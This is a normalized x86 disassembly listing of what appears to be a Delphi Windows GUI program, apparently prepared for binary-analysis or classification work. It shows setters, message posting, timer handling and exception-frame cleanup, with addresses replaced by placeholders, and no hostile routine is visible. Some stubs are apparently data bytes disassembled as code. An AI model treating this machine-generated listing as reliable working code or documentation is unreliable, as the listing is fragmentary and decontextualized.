mov eax [ eax + 0x34 ]
call sub_456a44
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_456a44
retn
sub_45a718
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_456a44
sub_45a760
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_4599b4
retn
mov eax edx
retn
sub_45a968
mov [ eax + 0x58 ] edx
call sub_45a734
retn
sub_45a99e
jmp sub_403738
sub_45a9a3
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_466fa8
call sub_403aa0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ad09
jmp sub_4039ec
sub_45ad10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403270
retn
sub_45ad26
jmp sub_4039ec
sub_45ae27
jmp sub_4039ec
sub_45ae2e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ae4b
mov eax [ ebp - 0x14 ]
call sub_403270
retn
sub_45ae44
jmp sub_4039ec
sub_45ae69
jmp sub_4039ec
sub_45aef3
jmp sub_4039ec
sub_45aefa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45af2c
push ebx
mov ebx eax
mov eax ebx
call sub_4186ec
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_421a6c
sub_45aff0
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_45b004
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_45b00c
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_45b3d1
jmp sub_4039ec
sub_45b3d8
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45b4d8
jmp sub_4039ec
sub_45b4df
pop ebp
retn
sub_45b976
inc esp
add ah dl
iretd
sub_45bbde
inc esp
add ah dl
iretd
sub_45c89e
inc esp
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
sub_45c99b
[ edi + edi * 8 - 0x2f002f ]
sub_45c9a2
stc
jmp esp
sub_45cba2
inc esp
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
sub_45d942
inc esp
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
sub_45dc64
mov eax [ rw-data ]
retn
sub_45dc6c
mov [ rw-data ] eax
retn
sub_45ddb4
jmp sub_403738
sub_45ddeb
jmp sub_4039ec
sub_45ddf2
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e0fa
jmp sub_4039ec
sub_45e101
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45e1a5
jmp sub_4039ec
sub_45e1ac
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e23c
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_45e968
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_45f014
sub_45e984
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_45e968
sub_45eaa4
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_45f014
sub_45eabc
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_45f014
sub_45ead4
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_45f014
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_45eb00
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_45eb0c
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_45f014
retn
sub_45edec
push ebx
mov ebx edx
mov edx ebx
call sub_449ee0
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_45ee5c
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_45ef84
jmp sub_4039ec
sub_45ef8b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ef94
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_45e3a0
mov eax [ ebx + 0x20c ]
call sub_45e3a0
sub_45eff4
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_45f004
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_45f0ff
jmp sub_4039ec
sub_45f10c
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_45f124
sub_45f340
retn
sub_45f3ae
jmp sub_4039ec
sub_45f3ed
jmp sub_4039ec
sub_45f420
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_44b3d8
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_45e62c
retn
sub_45f444
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_44b3f8
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_45e62c
retn
sub_45f539
jmp sub_4039ec
sub_45f540
mov eax [ ebp - 0x4 ]
call sub_44d358
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_45e294
mov eax [ ebp - 0x4 ]
call sub_45f014
sub_45f618
cmp dl [ eax + 0x220 ]
je r-xdata
retn
mov [ eax + 0x220 ] dl
call sub_44a5f4
sub_45f62c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_45f76c
jmp sub_4039ec
sub_45f7a4
jmp sub_4039ec
sub_45f7ab
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f7cb
lea eax [ ebp - 0x114 ]
call sub_403fe8
retn
sub_45f7c4
jmp sub_4039ec
sub_45f7cb
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_45fad2
jmp sub_4039ec
sub_45fad9
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40360c
sub_45fb2d
jmp sub_403738
sub_45fba9
jmp sub_403738
sub_45fbae
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_466fa8
call sub_403aa0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ff66
jmp sub_4039ec
sub_45ff6d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_460048
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41caf8
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_460060
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_460098
mov edx eax
mov eax esi
call sub_41ece8
pop esi
pop ebx
retn
sub_46007c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46143c
mov edx eax
mov eax esi
call sub_41ece8
pop esi
pop ebx
retn
sub_460098
push ebx
mov ebx eax
mov eax ebx
call sub_4610dc
mov edx r-xdata
call sub_42499c
pop ebx
retn
sub_46019c
push ebx
mov ebx eax
mov eax ebx
call sub_4601ac
xor al 0x1
pop ebx
retn
sub_4601ac
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_460208
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_460228
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_460248
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_460541
jmp sub_4039ec
sub_460548
pop ecx
pop ebp
retn
sub_46054c
xor eax eax
retn
sub_460824
jmp sub_4039ec
sub_46082b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403270
retn
sub_460841
jmp sub_4039ec
sub_46092b
jmp sub_4039ec
sub_460932
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46094f
mov eax [ ebp - 0xc ]
call sub_403270
retn
sub_460948
jmp sub_4039ec
sub_46096f
jmp sub_4039ec
sub_460c5a
jmp sub_4039ec
sub_460ded
jmp sub_4039ec
sub_4610dc
mov eax [ eax + 0x238 ]
retn
sub_4610e4
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4610f0
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_46142e
jmp sub_4039ec
sub_461435
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46143c
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_461484
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_44a5f4
sub_4614a0
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_4614dc
push ebx
mov ebx eax
mov eax ebx
call sub_44c588
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_4240e4
sub_461560
push ebx
mov ebx eax
mov eax ebx
call sub_44c5b0
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_424a40
sub_461580
push ebx
mov ebx eax
mov eax ebx
call sub_4611a0
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_461268
pop ebx
retn
sub_461dad
lea eax [ ebp - 0xb4 ]
call sub_403fe8
retn
sub_461db9
jmp sub_4039ec
j_sub_461dad
jmp sub_461dad
sub_461dc0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461f18
jmp sub_4039ec
sub_461f1f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462204
jmp sub_4039ec
sub_46220b
mov eax [ rw-data ]
call sub_464abc
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462222
add [ eax ] al
retn
sub_462480
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_4624a0
mov eax [ eax + 0x240 ]
call sub_428cc4
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_46685c
sub_462547
jmp sub_4039ec
sub_46254e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462571
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_424a18
retn
sub_46256a
jmp sub_4039ec
sub_462571
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462730
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4624a0
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_462998
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_459b68
sub_462a83
jmp sub_4039ec
sub_462a8a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462a90
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_462278
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_462ae8
call sub_463810
retn
sub_462f35
jmp sub_4039ec
sub_462f3c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403738#7
jmp sub_403738
sub_4635d4
jmp sub_403738
sub_4636cd
jmp sub_4039ec
sub_4636d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4636f1
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
sub_4636ea
jmp sub_4039ec
sub_4636f1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4636f8
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_428cc4
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_460140
sub_463718
call sub_403270
retn
sub_463770
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_4637d6
jmp sub_4039ec
sub_463984
jmp sub_403738
sub_4639b0
xor edx edx
call sub_4604a4
retn
sub_4639b8
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_4604a4
mov eax ebx
call sub_4469c4
pop ebx
retn
sub_463a3e
jmp sub_4039ec
sub_463a45
pop ebx
pop ecx
pop ebp
retn
sub_463a4c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_44d054
push eax
call PostMessageA
pop ebx
retn
sub_463c50
jmp sub_4039ec
sub_463cf1
jmp sub_4039ec
sub_463cfb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463d1a
mov eax [ rw-data ]
call sub_465f34
retn
sub_463d13
jmp sub_4039ec
sub_463d1a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463d37
lea eax [ ebp - 0x20 ]
call sub_403fe8
retn
sub_463d30
jmp sub_4039ec
sub_463d37
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463e18
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_445b70
retn
mov edx eax
mov eax [ rw-data ]
call sub_465588
retn
sub_46419c
mov edx eax
mov eax [ rw-data ]
call sub_466fa8
mov al 0x1
retn
sub_464284
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_4641ac
sub_464298
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_4641ac
sub_4642ac
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_4641ac
sub_4642c0
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_4641ac
sub_4642d4
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_46443f
jmp sub_4039ec
sub_464446
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46444c
push ebx
mov ebx eax
mov eax ebx
call sub_44b96c
mov eax ebx
call sub_44baf0
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_463a4c
sub_4646c2
jmp sub_4039ec
sub_4646c9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4646d0
push ebx
mov ebx edx
mov edx ebx
call sub_44bdd4
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_445c78
pop ebx
retn
sub_464724
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46478c
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_46473c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46478c
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_464758
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46478c
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_464770
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46478c
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_464a0c
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_464a18
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_464a24
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_464a30
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_464a3c
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_464a48
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_464a54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_418550
pop esi
pop ebx
retn
sub_464a68
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_464a84
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418550
pop esi
pop ebx
retn
sub_464a98
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_464aa0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418550
pop esi
pop ebx
retn
sub_464ab4
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_464b90
mov eax [ eax + 0x54 ]
call sub_4183f4
retn
sub_464b9c
mov eax [ eax + 0x54 ]
call sub_4186ec
retn
sub_464def
jmp sub_4039ec
sub_464e33
jmp sub_4039ec
sub_464e3a
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_464e88
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_464c88
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_40403c
pop esi
pop ebx
retn
sub_464ef4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_418550
pop esi
pop ebx
retn
sub_464f08
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_46510d
jmp sub_4039ec
sub_465114
pop ebx
mov esp ebp
pop ebp
retn
sub_46511c
inc [ eax + 0x8c ]
retn
sub_465124
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_465144
sub_465144
xor edx edx
call sub_465588
retn
sub_46557a
jmp sub_4039ec
sub_465601
jmp sub_4039ec
sub_465610
add eax 0x30
call sub_40cf90
retn
sub_465654
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
j_sub_403738#6
jmp sub_403738
sub_4656aa
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_466fa8
call sub_403aa0
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_465d79
jmp sub_4039ec
sub_465d80
pop ebx
mov esp ebp
pop ebp
retn
sub_465f08
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_465f34
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_465f60
xor edx edx
call sub_465e58
retn
sub_465f68
mov dl 0x1
call sub_465e58
retn
sub_465fdc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_465ff4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_4660c1
jmp sub_4039ec
sub_4660c8
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403738#5
jmp sub_403738
sub_466e10
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_466e66
jmp sub_403738
j_sub_403738#9
jmp sub_403738
sub_466f86
jmp sub_4039ec
sub_466f8d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_466f94
call sub_40cae0
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_46718d
jmp sub_4039ec
sub_467194
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46725b
jmp sub_4039ec
sub_467262
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467438
jmp sub_4039ec
sub_46743f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4674a0
jmp sub_4039ec
sub_4674a7
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4674b0
call sub_467278
retn
j_sub_403738#4
jmp sub_403738
sub_4676f4
jmp sub_4039ec
sub_4676fb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467829
jmp sub_4039ec
sub_467988
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_467c87
jmp sub_4039ec
sub_467cb6
jmp sub_4039ec
sub_467dc2
jmp sub_4039ec
sub_467dc9
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46815a
jmp sub_4039ec
sub_468161
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4681a4
cmp [ eax + 0xa4 ] 0x0
jne r-xdata
mov eax [ eax + 0xb0 ]
retn
push 0x0
push 0x1
push 0xb031
mov eax [ eax + 0x30 ]
push eax
call SendMessageA
retn
sub_4682d4
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_46831f
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_468330
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_468340
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_4683b3
jmp sub_4039ec
sub_4683ba
pop ebp
retn
sub_4683bc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_468350
call sub_403dbc
call sub_4682d4
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_45df40
call sub_417eb8
mciGetErrorStringA
jmp [ __import_lookup_table_17(winmm:mciGetErrorStringA) ]
sub_46844d
jmp sub_4039ec
sub_468454
pop ebp
retn
sub_468458
sub [ rw-data ] 0x1
retn
sub_468792
inc esp
add ah dl
iretd
sub_468d64
push ebx
mov ebx eax
mov eax ebx
call sub_448814
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x31d ] 0x0
je r-xdata
mov eax ebx
call sub_469c68
sub_468f30
cmp dl [ eax + 0x31c ]
je r-xdata
retn
mov ecx edx
mov [ eax + 0x31c ] cl
test cl cl
je r-xdata
mov dx [ eax + 0x2a2 ]
call sub_468f58
call sub_468f9c
jmp r-xdata
sub_4697dc
movsx ecx [ edx + 0xa ]
movsx edx [ edx + 0x8 ]
call sub_4696fc
retn
sub_4697ec
movsx ecx [ edx + 0xa ]
movsx edx [ edx + 0x8 ]
call sub_4696fc
retn
sub_469924
push esi
mov dl [ eax + 0x2aa ]
mov si 0xffb1
call sub_40346c
pop esi
retn
sub_4699bc
mov edx [ eax ]
call [ edx + 0xc8 ]
retn
sub_4699c8
mov edx [ eax ]
call [ edx + 0xc8 ]
retn
sub_4699d4
mov [ edx + 0xc ] 0x1
retn
sub_469b5c
cmp [ eax + 0x2e1 ] 0x0
jne r-xdata
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
sub_469b80
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_469ba0
push ebx
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_469bc0
push ebx
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
sub_469be0
push ebx
mov ebx eax
mov eax ebx
call sub_420cb0
mov eax ebx
call sub_4690ac
pop ebx
retn
sub_469ec6
jmp sub_4039ec
sub_469ecd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a9b0
cmp edx [ eax + 0x2fc ]
je r-xdata
mov [ eax + 0x2f0 ] 0x1
retn
mov [ eax + 0x2fc ] edx
sub_46a9c8
cmp dl [ eax + 0x2f4 ]
je r-xdata
retn
mov [ eax + 0x2f4 ] dl
sub_46aee1
jmp sub_4039ec
sub_46aee8
pop ebp
retn
sub_46aeec
sub [ rw-data ] 0x1
retn
sub_46af19
jmp sub_4039ec
sub_46af20
pop ebp
retn
sub_46af24
sub [ rw-data ] 0x1
retn
sub_46af71
jmp sub_4039ec
sub_46af78
pop ebp
retn
sub_46af7c
sub [ rw-data ] 0x1
retn
sub_46b1e7
jmp sub_4039ec
sub_46b282
jmp sub_4039ec
sub_46b2a8
push ebx
mov ebx eax
push ebx
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b140
call sub_403a24
pop ebx
retn
sub_46b4d0
jmp sub_4039ec
sub_46b4d7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b7f0
jmp sub_4039ec
sub_46b7f7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b81a
lea eax [ ebp - 0x50 ]
mov edx [ r-xdata ]
call sub_404a18
retn
sub_46b813
jmp sub_4039ec
sub_46b81a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46b938
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
retn
sub_46bab1
jmp sub_4039ec
sub_46bab8
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46bac0
push 0x0
xor ecx ecx
call sub_46b9ec
retn
sub_46bacc
xor ecx ecx
mov edx 0x20
call sub_402c84
retn
sub_46bd8a
jmp sub_4039ec
sub_46bd91
pop ebp
retn
sub_46be29
jmp sub_4039ec
sub_46be30
pop ebp
retn
sub_46be34
sub [ rw-data ] 0x1
retn
sub_46bf61
add [ esp + 0x4 ] 0xfffffd78
jmp sub_46cefc
sub_46bf6e
add [ esp + 0x4 ] 0xfffffd78
jmp sub_46cfe4
sub_46bf7b
add [ esp + 0x4 ] 0xfffffd78
jmp sub_46d000
sub_46bf88
add [ esp + 0x4 ] 0xfffffd78
jmp sub_46d00c
sub_46bf95
add [ esp + 0x4 ] 0xfffffd78
jmp sub_46d04c
sub_46bfa2
add [ esp + 0x4 ] 0xfffffd78
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_46c41e
inc esp
add ah dl
iretd
sub_46c856
jmp [ edx ]
sub_46cfcf
jmp sub_4039ec
sub_46cfd6
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
sub_46cfe4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
